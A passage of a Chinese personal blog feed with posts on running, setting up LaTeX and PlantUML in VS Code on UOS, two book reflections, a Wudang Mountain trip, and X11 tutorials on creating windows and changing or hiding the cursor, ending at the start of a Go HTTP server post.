<p>多看书多看报，少吃零食多运动。<br><img src="/2022/05/02/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E6%85%A2%E8%B7%91/1.jpg" alt="图1"></p>
]]></content>
      <categories>
        <category>运动</category>
      </categories>
      <tags>
        <tag>运动</tag>
      </tags>
  </entry>
  <entry>
    <title>【问题解决】UOS下搭建latex</title>
    <url>/2022/03/24/UOS%E6%90%AD%E5%BB%BAlatex/</url>
    <content><![CDATA[<h1 id="UOS系统下搭建latex环境"><a href="#UOS系统下搭建latex环境" class="headerlink" title="UOS系统下搭建latex环境"></a>UOS系统下搭建latex环境</h1><p><em><strong>UOS系统下搭建latex并使用plantuml进行绘图。</strong></em></p>
<span id="more"></span>
<h2 id="本文适读人群"><a href="#本文适读人群" class="headerlink" title="本文适读人群"></a>本文适读人群</h2><ol>
<li>有linux下使用vscode开发经验</li>
<li>了解linux下环境变量原理以及设置</li>
</ol>
<h2 id="本文能够知道什么"><a href="#本文能够知道什么" class="headerlink" title="本文能够知道什么"></a>本文能够知道什么</h2><ol>
<li>latex的搭建</li>
<li>latex中使用plantuml</li>
<li>vscode如何使用latex</li>
</ol>
<h2 id="本文不知道什么"><a href="#本文不知道什么" class="headerlink" title="本文不知道什么"></a>本文不知道什么</h2><ol>
<li>latex的语法</li>
<li>plantuml的搭建</li>
</ol>
<h2 id="latex的安装"><a href="#latex的安装" class="headerlink" title="latex的安装"></a>latex的安装</h2><ol>
<li><p>在官网对<code>Tex Live</code>进行下载，<a href="https://mirror.ctan.org/systems/texlive/tlnet/install-tl-unx.tar.gz">下载链接</a>。下载之后会得到一个install-tl-unx.tar.gz，解压之后获取install-tl，直接运行输入I即可安装。不推荐使用命令安装<code>sudo apt install texlive-full</code>，debian上游的版本太老。</p>
</li>
<li><p>将已安装成功的texlive路径加入至环境变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export MANPATH&#x3D;$&#123;MANPATH&#125;:&#x2F;usr&#x2F;local&#x2F;texlive&#x2F;2021&#x2F;texmf-dist&#x2F;doc&#x2F;man</span><br><span class="line">export INFOPATH&#x3D;$&#123;INFOPATH&#125;:&#x2F;usr&#x2F;local&#x2F;texlive&#x2F;2021&#x2F;texmf-dist&#x2F;doc&#x2F;info</span><br><span class="line">export PATH&#x3D;$&#123;PATH&#125;:&#x2F;usr&#x2F;local&#x2F;texlive&#x2F;2021&#x2F;bin&#x2F;x86_64-linux</span><br></pre></td></tr></table></figure>
<p><del>2. 将已安装成功的texlive的可执行程序软链放入<code>/usr/bin</code>中，如果用其他的都可放入</del>s</p>
</li>
<li><p>调用<code>tex --version</code>，有版本信息则是调用成功</p>
</li>
</ol>
<h2 id="latex引用包配置"><a href="#latex引用包配置" class="headerlink" title="latex引用包配置"></a>latex引用包配置</h2><ol>
<li>查看本地包存放地址 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kpsewhich -var-value&#x3D;TEXMFHOME</span><br></pre></td></tr></table></figure></li>
<li>将引用包存放至本地目录，在开发tex文件时，就可以找到了。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">环境变量为 &#x2F;home&#x2F;mecry&#x2F;texmf, 自定义包存放至&#x2F;home&#x2F;mecry&#x2F;texmf&#x2F;tex&#x2F;latex&#x2F;目录下</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="vscode的配置"><a href="#vscode的配置" class="headerlink" title="vscode的配置"></a>vscode的配置</h2><ol>
<li>在vscode扩展商店中安装<code>LaTeX Workshop</code>和<code>LaTeX Utilities</code>扩展插件</li>
<li>在vsocde首选项设置中搜索<code>latex-workshop.latex.tools</code>，点击setting进行设置</li>
<li>增加以下配置,此配置只针对lualatex，当vscode进行编译时调用的就是lualatex <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;latex-workshop.latex.recipes&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;lualatex-&gt;biber-&gt;lualatex&quot;,</span><br><span class="line">        &quot;tools&quot;: [</span><br><span class="line">            &quot;lualatex&quot;,</span><br><span class="line">            &quot;biber&quot;,</span><br><span class="line">            &quot;lualatex&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">],</span><br><span class="line">&quot;latex-workshop.latex.tools&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;lualatex&quot;,</span><br><span class="line">        &quot;command&quot;: &quot;lualatex&quot;,</span><br><span class="line">        &quot;args&quot;: [</span><br><span class="line">            &quot;-synctex&#x3D;1&quot;,</span><br><span class="line">            &quot;-shell-escape&quot;,</span><br><span class="line">            &quot;-interaction&#x3D;nonstopmode&quot;,</span><br><span class="line">            &quot;-file-line-error&quot;,</span><br><span class="line">            &quot;-pdf&quot;,</span><br><span class="line">            &quot;%DOC%&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;biber&quot;,</span><br><span class="line">        &quot;command&quot;: &quot;biber&quot;,</span><br><span class="line">        &quot;args&quot;: [</span><br><span class="line">            &quot;%DOCFILE%&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">],</span><br><span class="line">&quot;latex-workshop.view.pdf.viewer&quot;: &quot;tab&quot;,</span><br><span class="line">&quot;window.zoomLevel&quot;: -1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>latex-workshop.latex.tools：编译工具选项，也就是我们上面在 Build LaTex project 下拉菜单看到的，只要在这里配置了 tools ，就会新增到下拉菜单里供我们选择。</li>
<li>latex-workshop.latex.recipes：配置每一个编译的小环境。</li>
</ul>
</li>
</ol>
<h2 id="latex中使用plantuml"><a href="#latex中使用plantuml" class="headerlink" title="latex中使用plantuml"></a>latex中使用plantuml</h2><ol>
<li>首先需要将本机的plantuml环境搭建成功，此文档不进行赘述默认已完成安装</li>
<li>在plant<a href="https://plantuml.com/starting">官网</a>下载对应的jar扩展包</li>
<li>调用命令下载plantuml脚本 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install plantuml</span><br></pre></td></tr></table></figure></li>
<li>编辑<code>/usr/bin/plantuml</code>脚本，将本机下载的<code>plantuml.jar</code>路径进行编辑，将<code>$JAVA</code>开头这句话进行替换 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$JAVA -Djava.net.useSystemProxies&#x3D;true $HEADLESS -jar &quot;&#x2F;usr&#x2F;share&#x2F;plantuml&#x2F;plantuml.jar&quot; &quot;$@&quot;</span><br></pre></td></tr></table></figure>
 <code>-Djava.net.useSystemProxies=true $HEADLESS</code>这句话影响plantuml颜色，不加就会是黑白的，<code>/usr/share/plantuml/plantuml.jar</code>这个路径为系统的plantuml.jar路径，将第二步下载的文件进行替换。</li>
<li>编辑<code>/usr/share/texlive/texmf-dist/tex/lualatex/plantuml/plantuml.lua</code>脚本，将其<code>plantuml</code>路径进行替换 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--local plantUmlJar &#x3D; os.getenv(&quot;PLANTUML_JAR&quot;)</span><br><span class="line">--if not plantUmlJar then</span><br><span class="line">    --texio.write_nl(&quot;Environment variable PLANTUML_JAR not set.&quot;)</span><br><span class="line">    --return</span><br><span class="line">--end</span><br></pre></td></tr></table></figure>
 注释plantumljar <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">texio.write(&quot;Executing PlantUML... &quot;)</span><br><span class="line">--  local cmd &#x3D; &quot;java -jar &quot; .. plantUmlJar .. &quot; -t&quot;</span><br><span class="line">local cmd &#x3D; &quot;plantuml -charset UTF-8 -t&quot;</span><br></pre></td></tr></table></figure>
 将plantuml加入至cmd命令中并加上<code>-charset UTF-8 -t</code>，处理中文问题。</li>
</ol>
]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title>【读书有感】读《倦怠社会》</title>
    <url>/2022/02/28/%E8%AF%BB%E5%80%A6%E6%80%A0%E7%A4%BE%E4%BC%9A/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><em><strong>《倦怠社会》一本现代主义的躺平之书。 —–有时候不要光叫口号，还得补充补充理论知识。</strong></em></p>
<span id="more"></span>

<p>过年来到现在太忙了，很难抽出时间阅读些长篇大论，顺手把那本小本的《倦怠社会》抽半天时间看了，没想到感觉还不错。躺平口号贯彻我朋友圈，但都是喊口号，真躺的还真没几个，这本书就对”躺平“这个一概念进行详解，讲讲为什么躺平，躺平的优势，全世界都躺平会发生什么，建议喊口号的的人手一本熟读贯通。</p>
<p>开篇就讲卡夫卡对普罗米修斯和老鹰故事的理解，伤口为什么愈合了？老鹰为什么不继续折磨普罗米修斯？是因为伤口倦怠了，在倦怠中愈合，老鹰也倦怠了，在倦怠中不愿意折磨了。</p>
<p>读完之后我认为人从精神层面上是可以倦怠的，倦怠是一种奖励机制，一种免疫机制，就像你如果拥有强壮的身体，感冒就会随之而去，如果你是一个精神富足的人，焦虑/疲惫/愤怒也会随着你自我调节的倦怠随之而去。生活不止需要物质上的富足，也需要精神上的富足，对个体而言精神上的富足比物质富足重要的多，倦怠赋予人们一种特殊的舒适，一种放松的无为。在这种情况下，各种观感并没有变得疲惫，而是唤起了一种特殊的视觉能力。在平常生活中追求效率的时候，会忽略这种形态，疲惫的奥德修斯赢得了乌西卡的爱情，疲惫可以让人获取从未拥有过的年轻，从心理上。</p>
<h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><ul>
<li>在理想自我面前，真实的自我是一个失败者，他被淹没在自怨自艾中。自我同自身发动战争。在这场战争中没有胜利者，因为胜利者意味着胜利者死亡。</li>
<li>如果人们为了生命的缘故而否认疾病，那么这种遗世独立的生命，盲目的摆脱了其他的一切因素，也将因此转向毁灭和罪恶，走向无耻和自鸣得意。如果有人憎恶毁灭，那么他必须同时厌恶生命，因为死亡才等于永不衰退的生命。</li>
<li>期望不断提升，任何一次经历都无法带来满足，相应的，没有能力去完成任何一件事情。完成某项任务的满足感被屏蔽了，因为这种感觉使个人的经历具象化，使其拥有了形态和外貌，从而脱离自我获得独立的存在。</li>
<li>新自由主义导致了大量不平等，他不是美的政体。英语中fair一词表示“公正”，也表示“美”</li>
</ul>
]]></content>
      <categories>
        <category>阅读</category>
      </categories>
      <tags>
        <tag>读书有感</tag>
      </tags>
  </entry>
  <entry>
    <title>【旅游】武当山行</title>
    <url>/2022/02/14/%E6%AD%A6%E5%BD%93%E5%B1%B1%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="初五登武当山记"><a href="#初五登武当山记" class="headerlink" title="初五登武当山记"></a>初五登武当山记</h1><span id="more"></span>

<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>过年进食太多就想去运动一下，正好听说武当山下雪景色别有一番风味，就约朋友几个一起上一下武当山。<br><img src="/2022/02/14/%E6%AD%A6%E5%BD%93%E5%B1%B1%E8%A1%8C/%E5%9B%BE1.jpg" alt="图1"><br><img src="/2022/02/14/%E6%AD%A6%E5%BD%93%E5%B1%B1%E8%A1%8C/%E5%9B%BE2.jpg" alt="图2"><br><img src="/2022/02/14/%E6%AD%A6%E5%BD%93%E5%B1%B1%E8%A1%8C/%E5%9B%BE3.jpg" alt="图3"></p>
<p>总结：初五武当山人太多了，特别是金顶，2个多小时上山，但是在金顶排队了一个多小时，全都是来金顶烧香的。</p>
]]></content>
      <categories>
        <category>运动</category>
      </categories>
      <tags>
        <tag>旅游</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】X11学习（二）实现系统级别光标转圈</title>
    <url>/2021/12/31/X11%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89%E5%AE%9E%E7%8E%B0%E5%85%89%E6%A0%87%E7%B3%BB%E7%BB%9F%E7%BA%A7%E5%88%AB%E8%BD%AC%E5%9C%88/</url>
    <content><![CDATA[<h1 id="X11基础学习（二）实现系统级别光标转圈"><a href="#X11基础学习（二）实现系统级别光标转圈" class="headerlink" title="X11基础学习（二）实现系统级别光标转圈"></a>X11基础学习（二）实现系统级别光标转圈</h1><p><em><strong>本文学习X11设置系统的光标，使其全局状态为<code>等待</code>，参考开源项目<a href="https://github.com/linuxdeepin/startdde/tree/b2fe38552c48dd1086639b55b1fcd62c0fc7e2ca/iowait">linuxdeepin/startdde</a>，中IO读写设置光标逻辑。代码已归纳至我的<a href="https://github.com/MecryWork/x11Cursor">x11Cursor</a>可以使用cmake直接编译使用</strong></em></p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ol>
<li><p>X11是什么</p>
<p> X提供了GUI一个在unix系统下基本框架，可以绘图，移动窗口，显示窗口，与鼠标键盘一系列的交互。当前X已经更新到第11版所以简称为X11协议。与其类似的可以参考Wayland</p>
</li>
</ol>
<h2 id="局部设置鼠标为转圈状态"><a href="#局部设置鼠标为转圈状态" class="headerlink" title="局部设置鼠标为转圈状态"></a>局部设置鼠标为转圈状态</h2><ol>
<li><p>setOverrideCursor</p>
<p> 在QT实现窗口上，进行全局鼠标光标加载利用<code>QApplication::setOverrideCursor(QCursor(Qt::WaitCursor));</code>然后在使用<code>QApplication::restoreOverrideCursor();</code>对光标进行释放</p>
<h2 id="全局设置鼠标为转圈状态"><a href="#全局设置鼠标为转圈状态" class="headerlink" title="全局设置鼠标为转圈状态"></a>全局设置鼠标为转圈状态</h2></li>
<li><p>XcursorImagesLoadCursor</p>
<p> 在linux系统上观察，单一进程僵死或者无响应并不会导致光标转圈，当系统的CPU飙升时才会导致鼠标全局转圈。查看deepin的startdde中iowait代码发现存在时时监视CPU状态线程，当线程飙升时会调用<code>XcursorImagesLoadCursor + XDefineCursor + XFixesChangeCursorByName</code>函数设置光标，将光标样式设置为转圈样式就能实现</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * @brief 改变当前光标样式</span></span><br><span class="line"><span class="comment">    * @param theme &#123;const char *&#125; 选择光标主题</span></span><br><span class="line"><span class="comment">    * @param src &#123;const char *&#125; 目标样式</span></span><br><span class="line"><span class="comment"> * @param dst &#123;const char *&#125; 待修改样式</span></span><br><span class="line"><span class="comment"> * @param dst &#123;int&#125; 光标大小</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">xc_change_cursor_by_name</span><span class="params">(Display *dpy, <span class="keyword">const</span> <span class="keyword">char</span> *theme,<span class="keyword">const</span> <span class="keyword">char</span> *src, <span class="keyword">const</span> <span class="keyword">char</span>* dst, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (size == <span class="number">-1</span>) &#123;</span><br><span class="line">		size = XcursorGetDefaultSize(dpy);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// load cursor images</span></span><br><span class="line">	XcursorImages *dst_images = xc_load_images(theme, dst, size);<span class="comment">//①</span></span><br><span class="line">	<span class="keyword">if</span> (!dst_images) &#123;</span><br><span class="line">		XcursorImagesDestroy(dst_images);</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to load cursor images: %s/%s\n&quot;</span>, src, dst);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Cursor dst_cursor = XcursorImagesLoadCursor(dpy, dst_images);</span><br><span class="line"></span><br><span class="line">	Window root = XDefaultRootWindow(dpy);</span><br><span class="line">	XUndefineCursor(dpy, root);</span><br><span class="line">	XDefineCursor(dpy, root, dst_cursor);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Will change cursor: %s --&gt; %lu(%s)\n&quot;</span>, src, dst_cursor, dst);</span><br><span class="line">	XFixesChangeCursorByName(dpy, dst_cursor, src);<span class="comment">//更改光标样式</span></span><br><span class="line"></span><br><span class="line">	XcursorImagesDestroy(dst_images);</span><br><span class="line">	XFreeCursor(dpy, dst_cursor);</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> ①： Xcursor (mostly) follows the freedesktop.org spec for theming icons. The default search path it uses is ~/.local/share/icons, ~/.icons, /usr/share/icons, /usr/share/pixmaps. Within each of these directories, it searches for a directory using the theme name. Within the theme directory, it looks for cursor files in the ‘cursors’ subdirectory. It uses the first cursor file found along the path.<br> If necessary, Xcursor also looks for a “index.theme” file in each theme directory to find inherited themes and searches along the path for those themes as well.</p>
<p> If no theme is set, or if no cursor is found for the specified theme, Xcursor checks the “default” theme.</p>
<p> 上述为官方对them介绍，简而言之就是当你参数传入时他会从<code>~/.local/share/icons, ~/.icons, /usr/share/icons, /usr/share/pixmaps.</code>路径查找目标主题然后加载光标，如果主题不存在的设置为<code>default</code></p>
<h2 id="隐藏光标"><a href="#隐藏光标" class="headerlink" title="隐藏光标"></a>隐藏光标</h2></li>
<li><p>XFixesHideCursor</p>
<p> 隐藏光标原理是将光标设置为<code>x11 null cursor</code>,设置光标方法和上面一样，当不需要隐藏时就设置<code>x11 left_ptr cursor</code>进行还原。如下为创建光标为NULL</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">window = DefaultRootWindow(display);</span><br><span class="line">Cursor invisibleCursor;</span><br><span class="line">Pixmap bitmap;</span><br><span class="line">XColor black;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> data[] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line">black.red = black.green = black.blue = <span class="number">0</span>;</span><br><span class="line">bitmap = XCreateBitmapFromData(display, window, data, <span class="number">8</span>, <span class="number">8</span>);</span><br><span class="line">invisibleCursor = XCreatePixmapCursor(display, bitmap, bitmap, &amp;black, &amp;black, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p> 如果不想用上述方法对光标进行设置，可以用<code>libxfixes</code>库进行光标隐藏和显示</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void XFixesHideCursor (Display *dpy, Window win);</span><br><span class="line">void XFixesShowCursor (Display *dpy, Window win);</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>X11学习</category>
      </categories>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【读书有感】摘要《人生十大法则》</title>
    <url>/2021/12/06/%E4%BA%BA%E7%94%9F%E5%8D%81%E5%A4%A7%E6%B3%95%E5%88%99/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><em><strong>如果你的生活不尽如人意，试着说真话;如果你拼命地坚持某种意识或者沉迷于虚无主义，试着说真话;如果你感到脆弱、无用、绝望和困惑，试着说真话。</strong></em></p>
<span id="more"></span>

<h2 id="猴子"><a href="#猴子" class="headerlink" title="猴子"></a>猴子</h2><p>如果你想捕捉猴子，你需要找一个大的窄口瓶，瓶子口刚好可以让猴子的手正好伸进去。然后把瓶子装些石头，直到猴子无法拎起来，并且把食物放在瓶子中。猴子过来就会抓起瓶子的食物，但是因为握着食物，无法将手从瓶子抽出来，除非他选择放手，猴子肯定不会这么做，于是捕捉者就可以大摇大摆的把猴子抓起来。</p>
<h2 id="猛犸象"><a href="#猛犸象" class="headerlink" title="猛犸象"></a>猛犸象</h2><p>人类在捕捉猛犸象的时候吃不完的部分会留下来存储今后使用，一开始时候是偶然价值但是人们逐渐发现了这一举动的价值，就会产生一个概念：虽然我现在想把所有食物都吃掉，但是如果省下来一部分可以保证下次不会挨饿，这种概念升级：我没法吃掉整条猛犸象，我也不能存储，但我可以把我的食物都分出去可以保证下次我挨饿的时候会有人照顾我。</p>
<h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><ul>
<li><p>我应该如何使自己变得更强大?不要撒说或做你都夷的事情。我应该如何使自己变得更高尚?只遵照你心灵的旨意行事。</p>
</li>
<li><p>找应该如何面对最辣手的问题?将它们视为通向人生之道的大门。</p>
</li>
<li><p>我应该如何帮助落魄的人?用正确的示范来鼓舞他，使他重新振作起来。</p>
</li>
<li><p>当众人皆醉我独醒时应该做什么?坚定勇敢地说出事实的真相。</p>
</li>
<li><p>我们意识得到自己的无助、局限和死亡，也可以感受到疼痛、自厌、羞耻和恐惧。我们知道什么会让我们痛苦，如何让我们痛苦，甚至怎样让别人痛苦</p>
</li>
<li><p>人们天生喜欢秩序，在秩序中人们可以做长远打算，感到稳定、平静和自信，因此我们都倾向于留在熟悉的地方，坚持已有的思想观念。</p>
</li>
<li><p>如果你的生活不尽如人意，试着说真话;如果你拼命地坚持某种意识或者沉迷于虚无主义，试着说真话;如果你感到脆弱、无用、绝望和困惑，试着说真话。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>阅读</category>
      </categories>
      <tags>
        <tag>读书有感</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】X11学习（一）基本窗口的建立</title>
    <url>/2021/10/26/X11%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E6%9C%AC%E7%AA%97%E5%8F%A3%E7%9A%84%E5%BB%BA%E7%AB%8B/</url>
    <content><![CDATA[<h1 id="X11学习（一）基本窗口的建立"><a href="#X11学习（一）基本窗口的建立" class="headerlink" title="X11学习（一）基本窗口的建立"></a>X11学习（一）基本窗口的建立</h1><p><em><strong><a href="http://mech.math.msu.su/~vvb/2course/Borisenko/CppProjects/GWindow/xintro.html">http://mech.math.msu.su/~vvb/2course/Borisenko/CppProjects/GWindow/xintro.html</a>.</strong></em></p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ol>
<li><p>X11是什么</p>
<p> X提供了GUI一个在unix系统下基本框架，可以绘图，移动窗口，显示窗口，与鼠标键盘一系列的交互。当前X已经更新到第11版所以简称为X11协议。与其类似的可以参考Wayland</p>
</li>
</ol>
<h2 id="窗口的初始化"><a href="#窗口的初始化" class="headerlink" title="窗口的初始化"></a>窗口的初始化</h2><ol>
<li><p>XOpenDisplay</p>
<p> func：Display *XOpenDisplay(char *display_name);</p>
<p> 作用：打开指定X的服务器，返回一个关于服务器的display结构体。参数传入为NULL则是本机环境，如果是局域网地址则可以通过:来隔开，hostname:number.screen_number</p>
<p> 例子：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Display *display = XOpenDisplay(<span class="literal">NULL</span>); <span class="comment">//本机环境</span></span><br><span class="line">XOpenDisplay(<span class="string">&quot;192.168.0.12:0&quot;</span>);			<span class="comment">//局域网</span></span><br></pre></td></tr></table></figure></li>
<li><p>XCreateSimpleWindow</p>
<p> func: Window XCreateWindow(display, parent, x, y, width, height, border_width, depth, class, visual, valuemask, attributes)</p>
<p> 作用：创建一个简单窗口并返回一个窗口句柄</p>
<p> 例子：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Windows win = XCreateSimpleWindow(dpy, root, <span class="number">0</span>, <span class="number">0</span>, width, height, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xFFFF7700</span>);<span class="comment">//窗口创建</span></span><br></pre></td></tr></table></figure></li>
<li><p>XSelectInput</p>
<p> func: int XSelectInput(Display *display, Window w, long event_mask);</p>
<p> 作用： 选择窗口所需要监听的事件，第三个参数就是传入事件。否则X就不监听窗口的任何事件。</p>
<p> 例子：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">XSelectInput(xfc-&gt;display, xfc-&gt;window, KeyPressMask);</span><br></pre></td></tr></table></figure></li>
<li><p>XMapWindow</p>
<p> func: XMapWindow(Display *display, Window w);</p>
<p> 作用： 关联并映射子窗口让其能同步获取事件和显示。</p>
<p> 例子：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">XMapWindow(xfc-&gt;display, xfc-&gt;window);      <span class="comment">//关联窗口并显示</span></span><br></pre></td></tr></table></figure>
<h2 id="窗口事件处理"><a href="#窗口事件处理" class="headerlink" title="窗口事件处理"></a>窗口事件处理</h2></li>
<li><p>XNextEvent</p>
<p> func: XNextEvent(Display *display, XEvent)</p>
<p> 作用： 从事件队列获取下一个事件，如果队列为空则刷新缓存直到获取下一个事件。</p>
<p> 例子：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">XEvent event = &#123;<span class="number">0</span>&#125;; <span class="comment">//X的事件</span></span><br><span class="line">      XNextEvent(xfc-&gt;display, &amp;event);<span class="comment">//拉取窗口事件</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;event:%d\n&quot;</span>,event.type);</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="简单窗口的创建"><a href="#简单窗口的创建" class="headerlink" title="简单窗口的创建"></a>简单窗口的创建</h2><p>main.c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;X11/Xlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	Display *d;</span><br><span class="line">	Window w;</span><br><span class="line">	XEvent e;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *msg = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">	d = XOpenDisplay(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (d == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Cannot open display\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	s = DefaultScreen(d);</span><br><span class="line">	w = XCreateSimpleWindow(d, RootWindow(d, s), <span class="number">10</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0xFFFF7700</span>);</span><br><span class="line">	XSelectInput(d, w, ExposureMask | KeyPressMask);</span><br><span class="line">	XMapWindow(d, w);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		XNextEvent(d, &amp;e);</span><br><span class="line">		<span class="keyword">if</span> (e.type == Expose) &#123;</span><br><span class="line">			XFillRectangle(d, w, DefaultGC(d, s), <span class="number">20</span>, <span class="number">20</span>, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">			XDrawString(d, w, DefaultGC(d, s), <span class="number">10</span>, <span class="number">50</span>, msg, <span class="built_in">strlen</span>(msg));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (e.type == KeyPress)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	XCloseDisplay(d);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>X11学习</category>
      </categories>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【windows技术】go的http服务器响应实现</title>
    <url>/2021/10/09/go%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%93%8D%E5%BA%94%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="go实现服务器响应客户端操作"><a href="#go实现服务器响应客户端操作" class="headerlink" title="go实现服务器响应客户端操作"></a>go实现服务器响应客户端操作</h1><p><em><strong>利用go实现服务器响应客户端各种操作</strong></em></p>
<span id="more"></span>
<h2 id="前期调研"><a href="#前期调研" class="headerlink" title="前期调研"></a>前期调研</h2><p>在go开发官方文档<code>https://pkg.go.dev/net/http</code>发现了针对http服务器响应和对http客户端对服务器请求的说明，本文参考此说明开始编写。</p>
<h2 id="go服务器响应"><a href="#go服务器响应" class="headerlink" title="go服务器响应"></a>go服务器响应</h2><p><em>ListenAndServe starts an HTTP server with a given address and handler. The handler is usually nil, which means to use DefaultServeMux. Handle and HandleFunc add handlers to DefaultServeMux:</em></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">http.Handle(<span class="string">&quot;/foo&quot;</span>, fooHandler)</span><br><span class="line"></span><br><span class="line">http.HandleFunc(<span class="string">&quot;/bar&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	fmt.Fprintf(w, <span class="string">&quot;Hello, %q&quot;</span>, html.EscapeString(r.URL.Path))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>))</span><br></pre></td></tr></table></figure>

